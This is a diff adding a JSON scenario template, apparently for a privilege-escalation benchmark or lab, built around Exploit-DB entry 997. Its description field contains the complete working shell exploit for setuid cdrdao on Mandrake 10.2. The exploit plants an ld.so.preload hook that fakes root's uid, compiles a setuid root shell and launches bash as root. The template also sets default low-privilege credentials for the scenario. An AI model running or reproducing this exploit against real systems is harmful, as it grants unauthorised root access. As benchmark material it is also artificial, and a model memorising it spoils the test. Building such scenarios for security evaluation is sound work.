@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_997",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: cdrdao (Mandrake 10.2) - Local Privilege Escalation\n\nExploit source code (997.sh):\n```\n#!/bin/sh\n# cdrdao local root exploit\n# newbug [at] chroot.org\n# IRC: irc.chroot.org #chroot\n# May 2005\necho \"cdrdao private exploit\"\necho \"This exploit only for Mandrake series\"\necho \"newbug [at] chroot.org\"\necho \"May 2005\"\n\necho \"checking if cdrdao is setuid ...\";\nif [ ! -u /usr/bin/cdrdao ]; then\n       echo \"[-] Failed\";\n       exit\nfi\necho \"[+] done.\";\necho \"checking if /etc/ld.so.preload already exist ...\"\nif [ -f /etc/ld.so.preload ]; then\n       echo \"[-] Failed.\"\n       exit\nelse\n       echo \"[+] done.\"\nfi\n\necho \"checking if ~/.cdrdao already exist ...\"\nif [ -f ~/.cdrdao ]; then\n       rm -rf ~/.cdrdao\nfi\necho \"[+] done.\"\n\ncd /tmp\n\necho \"preparing hook library ...\"\ncat >ld.so.c<<EOF\n#include <stdlib.h>\nuid_t getuid()\n{\n       return 0;\n}\nEOF\necho \"[+] done.\"\necho \"preparing shell program ...\"\ncat >sh.c <<EOF\n#include <stdio.h>\n#include <unistd.h>\n\nint main(int argc,char **argv)\n{\n       setreuid(0,0);\n       setgid(0);\n\n       unlink(\"/tmp/ld.so\");\n       if(getuid())\n       {\n               printf(\"[-] Failed.\\n\");\n               unlink(argv[0]);\n               exit(0);\n       }\n       printf(\"[+] Congratulation, You win the game !!\\n\");\n       unlink(\"/etc/ld.so.preload\");\n\n       execl(\"/bin/bash\",\"bash\",(char *)0);\n\n       return 0;\n}\nEOF\necho \"[+] done.\"\n\necho \"link .cdrdao ==> /etc/ld.so.preload ...\"\nln -sf /etc/ld.so.preload ~/.cdrdao\necho \"[+] done.\"\n\necho \"compile hook library ...\"\ngcc -shared -o ld.so ld.so.c\necho \"[+] done.\"\necho \"compile shell program ...\"\ngcc -o sh sh.c\necho \"[+] done.\"\n\numask 0\n\necho \"run cdrdao ...\"\ncdrdao unlock --save >/dev/null 2>&1\necho \"[+] done.\"\n\necho \"checking if /etc/ld.so.preload created successful...\"\nif [ -f /etc/ld.so.preload ]; then\n       echo \"[+] done.\"\nelse\n       echo \"[-] Failed.\"\n       exit\nfi\necho \"/tmp/ld.so\">/etc/ld.so.preload\nrm -f /tmp/sh.c\nrm -f /tmp/ld.so.c\nsu -c \"chown root.root /tmp/sh;chmod 4755 /tmp/sh\" >/dev/null 2>&1\necho \"!@#\\$@%#$%#$%!@%^\"\n/tmp/sh\n\n# milw0rm.com [2005-05-17]\n```",
+  "cve": "",
+  "exploitdb_id": "997",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_997",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
